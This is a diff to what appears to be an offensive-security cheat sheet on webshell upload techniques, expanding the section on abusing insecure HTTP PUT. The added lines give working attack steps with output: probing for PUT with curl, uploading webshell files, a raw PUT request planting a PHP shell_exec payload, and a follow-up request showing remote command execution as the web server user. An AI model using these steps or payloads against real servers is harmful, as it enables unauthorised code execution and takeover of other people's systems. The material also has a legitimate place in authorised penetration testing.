@@ -16,9 +16,9 @@ Technique 7. Webshell upload by exploiting a Website vulnerability such as:
 	     - Remote Code Execution vulnerability
 	     - ...
 Technique 8. Webshell upload by exploing an insecure (writeable) file share (FTP/CIFS/SAMBA/NFS) of a Web server (i.e., C:\inetpub\wwwroot\ or /var/www/)
-Technique 8. Webshell upload using a Lotus Domino admin console
-Technique 9. Webshell upload using a Jenkins admin console
-Technique 10. ...
+Technique 9. Webshell upload using a Lotus Domino admin console
+Technique 10. Webshell upload using a Jenkins admin console
+Technique 11. ...
 ```
 ##### Technique 1 - PHPMyAdmin Web console
 ```
@@ -230,6 +230,28 @@ Example 2 - Kentico
 ##### Technique 6 - Webshell upload by abusing the insecure HTTP PUT method
 ```
 ➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
+	  - Examples with CURL
+            root@kali:~# curl -v -X OPTIONS http://x.x.x.x/test/
+            * Trying x.x.x.x...
+            * TCP_NODELAY set
+            * Connected to x.x.x.x (x.x.x.x) port 80 (#0)
+            > OPTIONS /test/ HTTP/1.1
+            > Host: x.x.x.x
+            > User-Agent: curl/7.60.0
+            > Accept: */*
+
+	    HTTP response:
+            < HTTP/1.1 200 OK
+            < DAV: 1,2
+            < MS-Author-Via: DAV
+            < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
+            < Allow: OPTIONS, GET, HEAD, POST
+            < Content-Length: 0
+            < Date: Wed, 15 Aug 2018 21:35:07 GMT
+            < Server: lighttpd/1.4.28
+            < 
+            * Connection #0 to host x.x.x.x left intact
+
 ➤ Step 2. Identify the DocumentRoot directory (Web root folder)
           Examples:
           - XAMP (Windows) = "c:\XAMPP\htdocs"
@@ -245,18 +267,60 @@ Example 2 - Kentico
           - curl -T test.txt http://www.sitename.com/foldername
 
 ➤ Step 4. If the file was uploaded successfully, then upload any Webshell file.
-          Examples:
-          - curl -T webshell.jsp http://www.sitename.com/<path>
-          - curl -T webshell.asp http://www.sitename.com/<path>
-          - curl -T webshell.aspx http://www.sitename.com/<path>
-          - curl -T webshell.php http://www.sitename.com/<path>
- 
+	  - Examples with CURL
+            $ curl -T webshell.jsp http://www.sitename.com/<path>
+            $ curl -T webshell.asp http://www.sitename.com/<path>
+            $ curl -T webshell.aspx http://www.sitename.com/<path>
+            $ curl -T webshell.php http://www.sitename.com/<path>
+	    
+	  - Example of HTTP PUT request sent with Burp proxy (repeater)	  
+            PUT /test/RCE.php HTTP/1.1
+            Host: x.x.x.x
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+            Cache-Control: max-age=0
+            Content-Length: 49
+
+            <?php echo shell_exec("id;pwd;uname -a;2>&1"); ?>
+	    
+	    HTTP response:
+            HTTP/1.1 201 Created
+            Content-Length: 0
+            Connection: close
+            Date: Wed, 15 Aug 2018 19:38:26 GMT
+            Server: lighttpd/1.4.28
+
+
 ➤ Step 5. Execute OS commands using the Webshell 
-          Examples: 
-          - http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
-          - http://www.sitename.com/<path>/webshell.asp?cmd=whoami
-          - http://www.sitename.com/<path>/webshell.php?cmd=whoami
-          - ...
+	  - Examples with CURL
+            $ http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
+            $ http://www.sitename.com/<path>/webshell.asp?cmd=whoami
+            $ http://www.sitename.com/<path>/webshell.php?cmd=whoami
+	    ...
+	  
+	  - Example of exploitation with Burp proxy (repeater)
+            GET /test/RCE.php HTTP/1.1
+            Host: x.x.x.x
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+            Cache-Control: max-age=0
+	    
+	    HTTP response:
+            HTTP/1.1 200 OK
+            X-Powered-By: PHP/5.3.10-1ubuntu3.21
+            Content-type: text/html
+            <SNIP>
+            uid=33(www-data) gid=33(www-data) groups=33(www-data)
+            /var/www/test
+            <SNIP>
 ```
 
 ##### Technique 7 - Webshell upload by exploiting a RFI vulnerability
